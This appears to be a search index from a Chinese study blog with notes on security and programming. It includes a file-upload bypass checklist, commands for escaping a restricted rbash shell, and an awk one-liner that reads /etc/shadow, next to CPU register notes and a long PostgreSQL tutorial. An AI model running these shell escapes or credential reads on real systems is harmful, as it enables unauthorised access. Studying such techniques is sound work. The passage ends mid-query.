[{"title":"命令执行","url":"%2F2019%2F04%2F23%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F"},{"title":"CSRF","url":"%2F2019%2F04%2F23%2FCSRF%2F","content":"\n##### 原理 #####\n\n\n\n##### FLASH CSRF #####\n","tags":["漏洞"],"categories":["网络安全"]},{"title":"文件操作","url":"%2F2019%2F04%2F23%2F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%2F","content":"\n##### 文件上传 #####\n\n1. 字典生成\n2. %00截断\n3. 畸形文件名\n  + windows\n    + shell.php(%80-99%)\n    + NTFS ADS特性\n      + shell.php.....\n      + shell.php::$Data\n      + shell.php:a.jpg\n4. 目录穿越\n5. 文件头绕过\n6. 修改Content-Type\n7. 双文件上传\n8. 超长截断\n  + 长文件名\n  + 长Content-Disposition\n9. 特殊文件\n  + 上传html、htm可以xss\n  + swf可以xss\n  + pdf在chrome可以做跳转\n  + cer、asa、jspx、php5、phtml等可能被当成动态语言解析\n  + .htaccess 、.user.ini 、web.config、web.xml等\n10. 无大小和次数限制（无限上传干掉硬盘）\n11. imagemagick命令执行\n\n##### 文件读取 #####\n1. 读取系统敏感文件\n\n##### 文件包含 #####\n1. 本地文件包含\n2. 远程文件包含\n\n##### 文件删除 #####\n\n1. 删除配置文件，破坏网站\n2. 删除安装锁，从新部署安装\n","tags":["文件操作"],"categories":["网络安全"]},{"title":"cpu中各个寄存器的作用","url":"%2F2019%2F04%2F12%2Fcpu%E4%B8%AD%E5%90%84%E4%B8%AA%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E4%BD%9C%E7%94%A8%2F","content":"\n##### 32位CPU #####\n\n+ 数据寄存器\n  + EAX ： 可以用做返回值\n    + AX：EAX的低16位\n      + AH：AX的低八位，可以用作累加器\n      + AL：AX的高八位，可以用作累加器\n  + EBX：可以用作基址寄存器，在内存寻址中用作基地址，\n    + BX：EBX的低16位，用作指针寄存器的时候搭配SI或者DI\n  + ECX\n    + CX：计数寄存器，在循环中控制循环次数\n      + CH\n      + CL：可以用作移位的位数\n  + EDX\n    + DX：在进行乘除运算时，可作为默认的操作数参与运算，也可以用于存放I/O的端口地址。\n  + PS：在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址，但在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果，而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。\n+ 变指和指针寄存器\n  + ESI：用于存放存储单元在段内的偏移量，是源串地址\n    + SI，和DS搭配使用\n  + EDI：用于存放存储单元在段内的偏移量，是目的串地址\n    + DI：和ES搭配使用\n+ 指针寄存器\n    + ESP：堆栈栈顶指针\n      + SP：\n    + EBP：基址针（堆栈栈底指针）\n      + BP：可以搭配SI和DI\n+ 段寄存器\n\n  + CS（Code SegmentRegister）：代码段寄存器，代码段的段值\n  + SS（StackSegmentRegister）：堆栈段寄存器，堆栈段的段值\n  + DS（Data SegmentRegister）：数据段寄存器，数据段的段值\n  + FS（ExtraSegmentRegister）: 附加段寄存器\n  + GS（ExtraSegmentRegister）: 附加段寄存器\n  + ES（ExtraSegmentRegister）: 附加段寄存器\n+ 指令指针寄存器\n  + EIP：是存放下次将要执行的指令在代码段的偏移量\n+ 标志寄存器\n  + EFLAGS\n    + CF：进位和借位标志位\n    + PF：奇偶标志位\n    + AF：辅助进位标志位\n    + ZF：零标志位\n    + SF：符号标志位\n    + OF：溢出标志位\n","tags":["笔记"],"categories":["二进制"]},{"title":"PE信息","url":"%2F2019%2F04%2F12%2FPE%E4%BF%A1%E6%81%AF%2F","content":"\n\n+ .text段。一般是代码段。\n+ .data段。一般是数据段。\n+ .rdata段。只读数据段。比如字符串。\n+ .bss段。未初始化数据段。比如static变量，有时在函数内才初始化。\n+ .idata。导入表。\n+ .edata段。导出表信息。\n+ .rsrc段。资源段。\n+ .debug段。调试信息段。\n+ .reloc段。基址重定位信息段，对于dll文件和sys文件是必须的，但是对于exe文件没有存在的必要性。\n\n\n+ VC6程序：四个区段 .text 代码段  .rdata 导入表 .data 数据段 .rsrc 资源段\n+ VS2008/2013：五个区段 .text 代码段  .rdata 导入表 .data 数据段 .rsrc 资源段 .reloc\n+ 易语言：四个区段 .text 代码段  .rdata 导入表 .data 数据段 .rsrc 资源段\n+ Delphi：八个区段CODE、DATA、BSS、.idata、.tls、.rdata、.reloc、.rsrc\n+ VB程序：五个区段.text .data .idata .rsrc .reloc\n","tags":["笔记"],"categories":["二进制"]},{"title":"cewl","url":"%2F2019%2F04%2F08%2Fcewl%2F","content":"\n``` example : cewl http://example.com -d 5 -w cewl.txt -v ```\n\n通过爬取指定网站的页面来生成一份字典。\n+ -d 指定爬取深度\n+ -w 指定字典保存的文件名\n+ -v 显示进度\n","tags":["信息搜集"],"categories":["网络安全"]},{"title":"dirb使用","url":"%2F2019%2F04%2F04%2Fdirb%E4%BD%BF%E7%94%A8%2F","content":"``` dirb http://example:port /usr/share/dirb/wordlists/common.txt ```\n\n一款神器的目录爆破工具，类似于御剑。鸟里面对应的目录下有很多字典，可以用的时候翻一下，说不定会有惊喜。\n","tags":["信息搜集"],"categories":["网络安全"]},{"title":"rbash逃脱","url":"%2F2019%2F03%2F31%2Frbash%E9%80%83%E8%84%B1%2F","content":"\n###### 步骤 ######\n\n1. 检查所有当前可以使用的命令，按两下tab键来列出当前能使用的所有命令。\n2. 检查配置了SUID的命令（别问啥是SUID，问也不说）。\n3. 检查sudo下可以使用的命令。\n4. 检查当前可以使用的脚本语言，例如python 或者expect。\n5. 检查重定向符号能不能使用。\n6. 检查特殊符号能否使用，例如“”“”，”&”等。\n\n\n###### 常用方法 ######\n+  使用vi或者vim\n    1. vi sss\n    2. :!/bin/ls -l .b*\n    3. :!/bin/bash\n+  使用ed\n    1. ed\n    2. !'/bin/sh'\n+  使用more或者less或者man\n    1. more一个长到翻页的文件\n    2. !'sh'\n+  使用pinfo\n    1. pinfo ls\n    2. !\n+  使用links\n    1. links www.baidu.com\n    2. 按esc,选择File->OS shell\n+  使用find命令\n    1. find -exec可以执行系统命令\n+  使用awk命令\n    1. awk 'BEGIN {system(\"/bin/sh\")}'\n+  使用expect命令\n    1. expect\n    2. spawn sh\n    3. sh\n+  使用python\n    1. python -c \"import os; os.system(\"/bin/sh\");\"\n+  使用ruby\n    1. irb\n    2. exec '/bin/sh'\n+  使用perl\n    1. perl -e 'system(\"sh -i\");'\n+  使用php\n    1. php -a\n    2. exec(\"sh -i\");\n","tags":["漏洞"],"categories":["网络安全"]},{"title":"Linux提权","url":"%2F2019%2F03%2F31%2FLinux%E6%8F%90%E6%9D%83%2F","content":"\n1. awk 'BEGIN{system(\"cat /etc/shadow\")}'\n","tags":["漏洞"],"categories":["网络安全"]},{"title":"pwn入门","url":"%2F2019%2F03%2F18%2Fpwn%E5%85%A5%E9%97%A8%2F","content":"\n1. nasm a.asm -o a.o -felf32\n2. objdump -d -M intel a.o\n\n3. objcopy -O binary a.o\n4. xxd -i code   \n\n\n5. gcc test.c -o test -m32 -zexecstack\n","tags":["笔记"],"categories":["二进制"]},{"title":"常见中间件","url":"%2F2019%2F02%2F25%2F%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%2F","content":"\n###### tomcat ######\n\n\n######  jetty ######\n\n\n###### apache  ######\n\n\n###### JBOSS  ######\n\n\n###### webloigc ######\n\n\n###### websphere ######\n\n######  glasshfish   ######\n\n######   IIS  ######\n\n###### Nginx  ######\n\n###### MQ  ######\n\n######  aria2 ######\n","tags":["笔记"],"categories":["网络安全"]},{"title":"sql入门","url":"%2F2019%2F01%2F25%2Fsql%E5%85%A5%E9%97%A8%2F","content":"\n\n##### postgresql笔记 #####\n因为傻鸟里面自带postgresql，因此就买了sql基础教程和sql进阶教程，依然以笔记的方式进行记录\n\n###### 初始 ######\n\n\n1. service postgresql start   //因为现在傻鸟里面postgresql不再开机自启了，所以需要手动启动。   \n2. su - postgresql     //密码为该用户名的密码\n3. psql -U postgresql -d shop     \n\n\n###### 数据准备 ######\n\n1. create database shop;     //创建数据库\n2. ```\ncreate table Product\n( product_id        CHAR(4)        NOT NULL,\n  product_name      VARCHAR(100)   NOT NULL,\n  product_type      VARCHAR(32)    NOT NULL,\n  sale_price        INTEGER                ,\n  purchase_price    INTEGER                ,\n  regist_date       DATE                   ,\n  PRIMARY  KEY   (product_id) );\n```\n3. 注：定长字符串（即char类型）在字符数未达到最大长度时会用半角空格补足。\n4. drop table Product;  //删除表\n5. alter table Product ADD COLUMN product_name_pinyin VARCHAR(100);  //追加列\n6. alter table Product DROP COLUMN product_name_pinyin;  //删除列\n7. ```\nBEGIN TRANSACTION;\nINSERT INTO Product VALUES('0001' , 'T恤衫',   '衣服',     '1000', '500', '2009-09-20');\nINSERT INTO Product VALUES('0002' , '打孔器',  '办公用品',  '500', '320', '2009-09-11');\nINSERT INTO Product VALUES('0003' , '运动T恤', '衣服',     '4000', '2800', NULL       );\nINSERT INTO Product VALUES('0004' , '菜刀',    '厨房用具', '3000', '2800', '2009-09-20');\nINSERT INTO Product VALUES('0005' , '高压锅',  '厨房用具',  '6800', '5000', '2009-01-15');\nINSERT INTO Product VALUES('0006' , '叉子',    '厨房用具',  '500', NULL, '2009-09-20');\nINSERT INTO Product VALUES('0007' , '擦菜板',  '厨房用具',  '880', '790', '2009-04-28');\nINSERT INTO Product VALUES('0008' , '圆珠笔',  '办公用品',  '100', NULL, '2009-11-11');\nCOMMIT;\n ```\n8. ALTER TABLE Poduct RENAME TO Product;  //修改表名\n9. ```\nCREATE TABLE ProductIns\n( product_id            CHAR(4)        NOT NULL,\n  product_name          VARCHAR(100)   NOT NULL,\n  product_type          VARCHAR(32)    NOT NULL,\n  sale_price            INTEGER        DEFAULT 0,\n  purchase_price        INTEGER                 ,\n  regist_date           DATE                    ,\n  PRIMARY KEY (product_id) );\n```\n10. ```\ncreate table ProductCopy\n( product_id        CHAR(4)        NOT NULL,\n  product_name      VARCHAR(100)   NOT NULL,\n  product_type      VARCHAR(32)    NOT NULL,\n  sale_price        INTEGER                ,\n  purchase_price    INTEGER                ,\n  regist_date       DATE                   ,\n  PRIMARY  KEY   (product_id) );\n```\n11. ```\ncreate table ProductType\n( product_type      VARCHAR(32)    NOT NULL,\n  sum_sale_price        INTEGER                ,\n  sum_purchase_price    INTEGER                ,\n  PRIMARY  KEY   (product_type) );\n```\n\n12. ```\ncreate table SampleMath\n(m NUMERIC  (10,3),\n n INTEGER        ,\n p INTEGER);\n```\n\n13. ```\nBEGIN TRANSACTION;\nINSERT INTO SampleMath(m, n, p) values (500, 0 , NULL);\nINSERT INTO SampleMath(m, n, p) values (-180, 0 , NULL);\nINSERT INTO SampleMath(m, n, p) values (NULL, NULL, NULL);\nINSERT INTO SampleMath(m, n, p) values (NULL, 7 , 3);\nINSERT INTO SampleMath(m, n, p) values (NULL, 5 , 2);\nINSERT INTO SampleMath(m, n, p) values (NULL, 4 , NULL);\nINSERT INTO SampleMath(m, n, p) values (8,NULL , 3);\nINSERT INTO SampleMath(m, n, p) values (2.27, 1 , NULL);\nINSERT INTO SampleMath(m, n, p) values (5.555, 2 , NULL);\nINSERT INTO SampleMath(m, n, p) values (NULL, 1 , NULL);\nINSERT INTO SampleMath(m, n, p) values (8.76, NULL , NULL);\nCOMMIT;\n```\n\n14. ```\ncreate table SampleStr\n(str1   VARCHAR(40),\n str2   VARCHAR(40),\n Str3   VARCHAR(40));\n```\n\n15. ```\nBEGIN TRANSACTION;\nINSERT INTO SampleStr (str1, str2, str3) values ('opx' ,  'rt'   , NULL );\nINSERT INTO SampleStr (str1, str2, str3) values ('abc',   'def'  , NULL);\nINSERT INTO SampleStr (str1, str2, str3) values ('山田',   '太郎'  ,'是我');\nINSERT INTO SampleStr (str1, str2, str3) values ('aaa',   NULL  ,NULL);\nINSERT INTO SampleStr (str1, str2, str3) values (NULL,    'xyz' ,NULL);\nINSERT INTO SampleStr (str1, str2, str3) values ('!@#$%', NULL   ,NULL);\nINSERT INTO SampleStr (str1, str2, str3) values ('ABC',   NULL  ,NULL);\nINSERT INTO SampleStr (str1, str2, str3) values ('aBC',   NULL  ,NULL);\nINSERT INTO SampleStr (str1, str2, str3) values ('abc太郎', 'abc'   ,'ABC');\nINSERT INTO SampleStr (str1, str2, str3) values ('abcdefabc', 'abc'   ,'ABC');\nINSERT INTO SampleStr (str1, str2, str3) values ('micmic',  'i'  ,'I');\nCOMMIT;\n```\n\n16. ```\ncreate table SampleLike\n( strcol VARCHAR(6)    NOT NULL,\n  PRIMARY KEY (strcol));\n```\n\n17. ```\nBEGIN TRANSACTION;\nInsert INTO SampleLike (strcol) VALUES ('abcddd');\nInsert INTO SampleLike (strcol) VALUES ('dddabc');\nInsert INTO SampleLike (strcol) VALUES ('abdddc');\nInsert INTO SampleLike (strcol) VALUES ('abcdd');\nInsert INTO SampleLike (strcol) VALUES ('ddabc');\nInsert INTO SampleLike (strcol) VALUES ('abdd c');\nCOMMIT;\n```\n\n18. ```\ncreate table ShopProduct\n(shop_id    CHAR(4)      NOT NULL,\n shop_name  VARCHAR(200) NOT NULL,\n product_id CHAR(4)      NOT NULL,\n quantity   INTEGER      NOT NULL,\n PRIMARY KEY (shop_id, product_id));\n```\n\n19. ```\nBEGIN TRANSACTION;\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000A', '东京', '0001', 30);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000A', '东京', '0002', 50);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000A', '东京', '0003', 15);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000B', '名古屋', '0002', 30);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000B', '名古屋', '0003', 120);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000B', '名古屋', '0004', 20);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000B', '名古屋', '0006', 10);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000B', '名古屋', '0007', 40);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000C', '大阪', '0003', 20);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000C', '大阪', '0004', 50);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000C', '大阪', '0006', 90);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000C', '大阪', '0007', 70);\nINSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES('000D', '福冈', '0001', 100);\nCOMMIT;\n```\n\n20. ```\ncreate table Product2\n(\n  product_id      char(4)       NOT NULL,\n  product_name    VARCHAR(100)  NOT NULL,\n  product_type    VARCHAR(32)   NOT NULL,\n  sale_price      INTEGER               ,\n  purchase_price  INTEGER               ,\n  regist_date     DATE                  ,\n  PRIMARY KEY (product_id));\n```\n\n21. ```\nBEGIN TRANSACTION;\nINSERT INTO Product2 VALUES('0001', 'T恤衫',   '衣服',     1000,  500 , '2008--09-20');\nINSERT INTO Product2 VALUES('0002', '打孔器',  '办公用品',  500,   320 , '2009-09-11');\nINSERT INTO Product2 VALUES('0003', '运动T恤', '衣服',     4000,  2800 , NULL);\nINSERT INTO Product2 VALUES('0009', '手套',    '衣服',     800,   500,   NULL);\nINSERT INTO Product2 VALUES('0010', '水壶',    '厨房用具', 2000,   1700, '2009-09-20');\nCOMMIT;\n```\n\n22. ```\ncreate table InventoryProduct\n(\n  inventory_id       CHAR(4)     NOT NULL,\n  product_id         CHAR(4)     NOT NULL,\n  inventory_quantity INTEGER     NOT NULL,\n  PRIMARY KEY   (inventory_id, product_id));\n```\n\n23. ```\nBEGIN TRANSACTION;\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0001', 0);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0002', 120);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0003', 200);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0004', 3);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0005', 0);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0006', 99);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0007', 999);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P001', '0008', 200);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0001', 10);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0002', 25);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0003', 34);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0004', 19);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0005', 99);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0006', 0);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0007', 0);\nINSERT INTO InventoryProduct (inventory_id,   product_id,   inventory_quantity)   values('P002', '0008', 18);\nCOMMIT;\n```\n\n###### select语句 ######\n\n(万物基于select。。。。。[啊呸，咩有insert你select毛线])\n\n1. select * from Product;   //大力出奇迹\n2. select product_id, product_name from Product;\n3. select product_id as id, product_name as name, purchase_price as price from Product; //起外号，当然也可以用中文，但是需要使用双引号引起来（书上是这样写的但是在鸟里面是不需要用双引号的）。\n4. select 'fff' as string, 18 as number, product_id, product_name from Product;   //查询中插入常数或者字符串。\n5. select DISTINCT product_type from Product;  //清除重复内容   注：NULL的条目也会缩减为一条，并且DISTINCT只能放在第一个列名之前。\n6. select * from Product where product_type = '衣服';\n7. 注释语句： --或者/××/\n8. select product_name, sale_price, sale_price * 2 as \"salse_price_x2\" from Product; //进行四则运算。 注：包含null的运算最后结果肯定为NULL。\n9. select * from Product where sale_price <> 500;  //不等于500\n10. select * from Product where sale_price <= 500;  //小于等于500\n11. 注：一定让不等号在左，等号在右。\n12. 注：不能对NULL使用比较运算符。\n13. select * from Product where purchase_price is null;  //字段内容为空\n14. select * from Product where not sale_price <= 500;  //大于500\n15. AND运算符在两侧的查询条件同时成立时整个查询条件才成立。\n16. OR运算符在其两侧的查询条件有一个成立时整个查询条件成立。\n17. select * from Product where product_type = '厨房用具' and sale_price >= 3000;\n18. select * from Product where product_type = '厨房用具' or sale_price >= 3000;\n19. AND运算符优先级高于OR，可以使用括号调整优先级顺序。\n20. select * from Product where product_type = '办公用品' and ( regist_date = '2009-09-11' or regist_date = '2009-09-20');\n\n###### 对表进行聚合查询 ######\n\n1.  常用聚合函数：\n  + COUNT： 计算表中的记录数（行数）\n  + SUM：   计算表中数值列中数据的合计值\n  + AVG：   计算表中数值列中数据的平均值\n  + MAX：   求出表中任意列中数据的最大值\n  + MIN：   求出表中任意列中数据的最小值\n2. select count(×) from Product;\n3. select sum(sale_price) from Product;\n4. select sum(sale_price) as  sale_price ,sum(purchase_price) as purchase_price from Product;\n5. select avg(sale_price) from Product;\n6. select MAX(sale_price), MIN(purchase_price) from Product;\n7. select count(distinct product_type) from Product;  //计算去除重复数据之后的数据行数。\n8. select product_type,  COUNT(×) from Product GROUP BY product_type;   //分组计算\n9. select purchase_price, COUNT(×) FROM Product where product_type = '衣服' GROUP BY purchase_price;\n10. 注：group by 子句中不能使用别名\n11. 只有select子句和having子句以及order by子句能使用COUNT等聚合函数\n12. select product_type, count(×) from Product group by product_type having COUNT(×) = 2;   //having 子句使用方法\n13. select product_type, avg(sale_price) from Product group by product_type having avg(sale_price) >= 2500;   //having 子句使用方法\n14. select product_type, count(×) from Product group by product_type having product_type = '衣服'; 结果等同于 select product_type, count(×) from Product where product_type = '衣服' group by product_type;\n15. select * from Product order by sale_price;  //升序排序\n16. select * from Product order by sale_price desc; //降序排序\n17. select * from Product order by sale_price， purchase_price; 在sale_price相同时使用purchase_price排序。\n18. select product_id as id, sale_price as sp from Product order by id;\n19. select子句中未查询的列也可以在order by子句中使用。\n20. order by 子句也可以使用聚合函数。\n21. select product_type, count(×) from Product group by product_type order by count(×);\n\n###### 数据更新 ######\n\n恩，万物基于insert(create你闭嘴)。\n\n1. insert into ProductIns (product_id, product_name, product_type, sale_price, purchase_price, regist_date) values ('0001', 'T恤衫', '衣服', 1000, 500, '2009-09-20');\n2. ```多行插入\nINSERT INTO ProductIns values ('0002', '打孔器', '办公用品', 500, 320, '2009-09-11'),\n                              ('0003', '运动T恤', '衣服', 4000, 2800, NULL),\n                              ('0004', '菜刀', '厨房用具', 3000, 2800, '2009-09-20');\n\n```\n\n3. insert into ProductIns values ('0005', '高压锅', '厨房用具', 6800, 5000, '2009-01-15');          //省略列清单\n4. insert into ProductIns (product_id, product_name, product_type, sale_price, purchase_price, regist_date) values ('0006', '叉子', '厨房用具', 500, NULL, '2009-09-20');      //插入NULL\n5. insert into ProductIns (product_id, product_name, product_type, sale_price, purchase_price, regist_date) values ('0007', '擦菜板', '厨房用具', DEFAULT, 790, '2009-04-28');  //显式插入默认值\n6. insert into ProductIns ProductCopy(product_id, product_name, product_type, sale_price, purchase_price, regist_date) select product_id, product_name, product_type, sale_price, purchase_price, regist_date from Product;  //copy一个表中的数据\n7. insert into ProductType (product_type, sum_sale_price, sum_purchase_price) select product_type, sum(sale_price), sum(purchase_price) from Product GROUP BY product_type; //计算统计值\n8. delete from Product where sale_price >= 4000;\n9. update Product set regist_date = '2009-10-10';\n10. update Product set sale_price = sale_price * 10 where product_type = '厨房用具';\n11. update Product set sale_price = sale_price × 10, purchase_price = purchase_price / 2 where product_type = '厨房用具' ;   //多列更新\n12. update Product set (sale_price, purchase_price) = (sale_price × 10, purchase_price / 2) where product_type = '厨房用具';\n13. 事务：需要在同一个处理单元中执行的一系列更新处理的集合。\n14. COMMIT 在事务末尾为提交， rollback 数据回滚，回滚到开始事务之前的状态。\n15. DBMS事务的四种特性：\n  + 原子性（Atomicity）：指在事务结束时，所包含的更新处理要么全都执行，要么完全不执行。\n  + 一致性（Consistency）:事务中所包含的数据更新处理要满足数据库提前设置的约束。\n  + 隔离性（isolation）：不同事务之间互不干扰。例如在某个事务中进行的更改，在该事务完成之前对其他事务而言是不可见的。\n  + 持久性（Durability）：在事务结束后，DBMS能保证该时间点的数据状态会被保存。\n\n###### 复杂查询 ######\n\n1. 视图和表的区别：\n  + 表中保存的是实际的数据。\n  + 视图中保存的是select语句，视图本身并不保存数据。\n2. 视图的优点：\n  + 因为视图不保存数据，因此节省存储设备的容量。\n  + 将频繁使用的select语句保存成视图，这样就不需要每次重写select语句。\n3. ```创建视图\ncreate view ProductSum(product_type, cnt_product)\nas\nselect product_type, count(*) from Product group by product_type;\n```\n\n4. select * from ProductSum;  //查询试图（貌似和查表没啥区别）\n5. 可以创建多重视图（少用，因为貌似会降低sql的性能）\n6. 视图的限制\n  + 定义视图时不可以使用order by语句。因为视图和表一样，数据行都是没有顺序的。\n  + 可以更新视图的限制条件：\n    + select语句未使用distinct。\n    + from语句只有一张表。\n    + 未使用group by语句。\n    + 未使用having语句。\n\n7. ```可以更新的视图\ncreate view ProductJim(product_id, product_name, product_type, sale_price, purchase_price, regist_date)\nas\nselect * from Product where product_type = '办公用品';\n```\n\n8. postgresql中的视图会被初始设定为只读，如果需要允许更新时，需要执行下面的语句。\n\n9. ```\ncreate or replace rule insert_rule\nas on insert\nto ProductJim do instead insert into Product VALUES(\n  new.product_id,\n  new.product_name,\n  new.product_type,\n  new.sale_price,\n  new.purchase_price,\n  new.regist_date);\n```\n\n10. drop view ProductJim;  //删除视图\n11. drop view ProductJim CASCADE;删除关联视图\n12. 子查询：一次性的视图，用完即删。就是将用来定义视图的select语句直接写到from子句中。\n13. select product_type, cnt_product from (select product_type, count(×) as cnt_product from Product group by product_type) as ProductSum;  //子查询\n14. 子查询可以无限嵌套\n15. 原则上子查询必须设定名称。\n16. 标量子查询就是必须并且只能返回一行一列的结果的子查询。\n17. select product_id, product_name,sale_price from Product where sale_price > (select  avg(sale_price) from Product);  //标量子查询\n18. 标量子查询的语句可以用在任何可以使用单一值的地方。\n19. select product_id, product_name, sale_price, (select avg(sale_price) from Product) as avg_price from Product;\n20. select product_type, product_name, sale_price from Product as p1 where sale_price > (select avg(sale_price) from Product as p2 where p1.product_type = p2.product_type);   //关联子查询\n\n###### 函数、谓词、case表达式 ######\n\n1. 算术函数（进行数值计算）\n  + ``` + - * / ```\n  + select m , abs(m) as abs_col from SampleMath;  //计算绝对值\n  + select n, p, mod(n,p) as mod_col from SampleMath;  //计算求余\n  + select m, n , round(m, n) as round_col from SampleMath;  //对m列的数值进行n列位数的四舍五入， 即n表示保留小数的位数\n2. 字符串函数（进行字符串操作）\n  + select str1, str2, str1 || str2 as str_concat from SampleStr; //字符串拼接\n  + select str1 , LENGTH(str1) as len_str from SampleStr;   //字符串长度\n  + select str1, LOWER(str1)  as lower_str from SampleStr ; //小写转换， UPPER是大写转换。\n  + select str1, str2, str3, REPLACE(str1, str2, str3) as rep_str from SampleStr;  //将str1中的str2替换为str3。\n  + select str1, substring(str1 from 3 for 2) as sub_str from SampleStr;  //将str1中的第三个字符开始截取2个字符。\n3. 日期函数（进行日期操作）\n  + select current_date;    //查询当前日期\n  + select current_time;    //查询当前时间\n  + select current_timestamp; //查询当前日期和时间\n  + select current_timestamp, extract(year from current_timestamp) as year, extract(month from current_timestamp) as month, extract(day from current_timestamp) as day, extract(hour from current_timestamp) as hour;  //extract截取时间函数\n4. 转换函数（转换数据类型和值）\n  + select cast('0001' as INTEGER) as int_col;  //字符串转换为数值类型\n  + select cast('2009-12-14' as date) as date_col;  //字符串转换为日期类型\n  + select COALESCE(NULL, 1) AS col_1, COALESCE(NULL, 'test', NULL) as col_2, COALESCE(NULL, NULL, '2009-11-01') as col_3;  //将null转换为其他值\n  + select COALESCE(str2, 'NULL') from SampleStr; //将null转换为字符串\n  + select str1, str2, COALESCE(str2, str1) from SampleStr; // 将str2列中的null替换为st1列中的值\n5. 聚合函数（进行数据聚合）\n\n6. 谓词就是返回值为真值的函数\n7. 比较运算符的正式名称就是比较谓词。\n8. 当需要进行字符串的部分一致查询时需要使用like谓词。\n9. 字符串的前方一致，中间一致和后方一致\n   + 前方一致：以查询字符串开头的字符串。\n   + 中间一致：字符串含有作为查询条件的字符串。\n   + 后方一致：以查询字符串作为结尾的字符串。\n10. select * from SampleLike where strcol like 'ddd%';   //前方一致查询\n11. select * from SampleLike where strcol like '%ddd%';  //中间一致查询\n12. select * from SampleLike where strcol like '%ddd';   //后方一致查询\n13. 可以使用_代替%来进行模糊匹配，但是_只表示任意一个字符\n14. select * from SampleLike where strcol like 'abc__'; //前方一致查询\n15. select * from Product where sale_price between 100 and 1000;  //范围查询，注：between查询包含临界值\n16. select * from Product where purchase_price is null;  //  应该不用解释了，还有一个not null\n17. select * from Product where purchase_price in (320, 500, 5000); // 等同于 purchase_price = 320 or purchase_price = 500 or purchase_price = 5000\n18. 可以将子查询作为in谓词的参数。\n19. select * from Product where product_id in (select product_id from ShopProduct where shop_id = '000C');    //别忘了还有not in\n20. select * from Product AS P where exists (select * from ShopProduct as SP where SP.shop_id = '000C' AND SP.product_id = P.product_id);\n21. ```case表达式\nselect product_name ,\n      case when product_type = '衣服'\n           then 'A: ' ||  product_type\n           when product_type = '办公用品'\n           then 'B: ' ||  product_type\n           when product_type = '厨房用具'\n           then 'C: ' || product_type\n           else NULL\n      end as abc_product_type\nfrom Product;\n```\n\n22. ```使用case表达式进行行列转换\nselect sum(case when product_type = '衣服'\n                then sale_price else 0 end) as sum_price_clothes,\n       sum(case when product_type = '厨房用具'\n                then sale_price else 0 end) as sum_price_kitchen,\n       sum(case when product_type = '办公用品'\n                then sale_price else 0 end) as sum_price_office\nfrom Product;\n```\n\n###### 表的加减法 ######\n\n\n1. select product_id, product_name from Product union select product_id, product_name from Product2;  //并集运算\n2. select product_id, product_name from Product union all select product_id, product_name from Product2;  //并集运算但是会显示重复记录\n3. union运算注意事项：\n   + 作为运算对象的记录的列数必须相同。\n   + 作为运算对象的记录中列的类型必须一致。\n   + 可以使用任意select语句，但是order by 语句只能在最后使用一次。\n4. select product_id, product_name from Product intersect select product_id, product_name from Product2;  //交集运算\n5. select product_id, product_name from Product intersect all select product_id, product_name from Product2;  //交集运算并显示重复记录\n6. select product_id, product_name from Product except select product_id, product_name from Product2;  //差集运算（啥，你问什么是差集。。。。。你可以去问问你高(高中)数（数学）老师，顺便拜个年。）\n7. select  SP.shop_id, SP.shop_name, SP.product_id, P.product_name, P.sale_price from ShopProduct as SP inner join Product as P on SP.product_id = P.product_id;   //对两张表进行内联结\n8. select  SP.shop_id, SP.shop_name, SP.product_id, P.product_name, P.sale_price from ShopProduct as SP inner join Product as P on SP.product_id = P.product_id where SP.shop_id = '000A';   //对两张表进行内联结并查询东京店的内容\n9. 内联结要点\n  + 需要在from子句中指定多张表。\n  + 进行内联结的时候必须使用on子句，并且要书写在from和where之间。on子句也可以使用and和or\n  + 使用联结时select子句中的列需要按照<表的别名或者表名>.<列名>的格式来进行书写。\n10. select  SP.shop_id, SP.shop_name, SP.product_id, P.product_name, P.sale_price from ShopProduct as SP right outer join Product as P on SP.product_id = P.product_id; //外联结查询 ：指定from 子句中写在右侧的表为主表，最终查询结果会包含主表的所有数据。\n11. ```三张表的内联结查询\nselect 